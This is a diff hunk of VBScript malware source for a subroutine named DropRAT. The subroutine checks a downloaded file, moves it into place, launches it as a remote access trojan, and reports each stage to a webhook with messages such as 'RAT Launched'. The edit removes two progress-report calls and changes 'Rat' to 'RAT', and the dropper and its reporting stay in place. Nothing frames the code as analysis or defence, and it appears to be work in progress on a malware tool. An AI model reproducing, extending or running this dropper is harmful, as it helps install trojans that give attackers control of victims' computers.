@@ -90,8 +90,6 @@ Sub DropRAT(targetWH, sendRocket)
     If fso.FileExists(tmpDat) Then datSize = fso.GetFile(tmpDat).Size
     On Error Goto 0
 
-    If sendRocket Then Call PostEmbedTo(":inbox_tray: Write " & dlOk, "DL: " & status & " | Mem: " & bodyLen & " | Disk: " & datSize, 10181046, targetWH)
-
     If Not dlOk Then Exit Sub
     If datSize < 100000 Then Exit Sub
 
@@ -109,11 +107,9 @@ Sub DropRAT(targetWH, sendRocket)
     mvOk = fso.FileExists(op)
     On Error Goto 0
 
-    If sendRocket Then Call PostEmbedTo(":arrows_counterclockwise: Move " & mvOk, "exe exists: " & mvOk, 10181046, targetWH)
-
     If Not mvOk Then Exit Sub
 
-    If sendRocket Then Call PostEmbedTo(":white_check_mark: Rat Launched", "Rat Launched", 10181046, targetWH)
+    If sendRocket Then Call PostEmbedTo(":white_check_mark: RAT Launched", "RAT Launched", 10181046, targetWH)
     Call RunCmd("""" & op & """")
 End Sub
 
